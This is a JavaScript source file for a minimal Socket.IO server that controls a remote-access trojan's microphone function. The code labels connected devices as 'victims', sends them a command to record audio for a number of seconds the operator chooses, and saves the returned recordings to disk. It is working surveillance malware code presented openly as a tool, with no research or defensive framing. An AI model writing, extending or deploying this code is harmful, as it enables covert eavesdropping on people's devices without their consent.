// server.js – A minimal headless server for mic control only using original Socket.IO API (v2)

const readline = require('readline');
const fs = require('fs');
const socketio = require('socket.io');

const MIC_ORDER = 'x0000mc';

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// Ensure the "audio" folder exists
const audioFolder = './audio';
if (!fs.existsSync(audioFolder)) {
  fs.mkdirSync(audioFolder);
}

// Ask for the port number
rl.question("Enter port to listen on: ", (portInput) => {
  const port = parseInt(portInput) || 42474;
  console.log(`Starting server on port ${port}...`);

  // Using Socket.IO v2 API:
  const io = socketio.listen(port);
  let victimSocket = null;

  io.sockets.on('connection', (socket) => {
    console.log(`Victim connected: ${socket.id}`);
    victimSocket = socket;

    socket.on('disconnect', () => {
      console.log("Victim disconnected.");
      victimSocket = null;
    });

    // Listen for the mic audio response from the victim
    socket.on(MIC_ORDER, (data) => {
      if (data.file === true && data.buffer && data.name) {
        console.log(`Audio file received: ${data.name}`);
        const filePath = `${audioFolder}/${data.name}`;
        let audioBuffer = Buffer.isBuffer(data.buffer)
          ? data.buffer
          : Buffer.from(data.buffer);
        fs.writeFile(filePath, audioBuffer, (err) => {
          if (err) console.error("Error saving file:", err);
          else console.log(`Audio file saved as ${filePath}`);
          // Once the file is saved, prompt for the next recording command.
          promptForRecording();
        });
      }
    });
  });

  // Function to prompt for mic recording commands.
  // It checks for a connected device before asking for input.
  const promptForRecording = () => {
    if (!victimSocket) {
      console.log("No victim connected. Waiting for connection...");
      return setTimeout(promptForRecording, 5000); // Check again in 5 seconds.
    }
    rl.question("Enter duration: ", (answer) => {
      if (answer.toLowerCase() === 'exit') {
        console.log("Exiting.");
        rl.close();
        process.exit(0);
      }
      const seconds = parseInt(answer);
      if (isNaN(seconds) || seconds <= 0) {
        console.log("Please enter a valid positive number for seconds.");
        return promptForRecording();
      }
      console.log(`Sending mic record command for ${seconds} second(s)...`);
      victimSocket.emit(MIC_ORDER, { order: MIC_ORDER, sec: seconds });
      // Do not prompt again here—wait until audio data is received.
    });
  };

  // Start the prompt loop.
  promptForRecording();
});
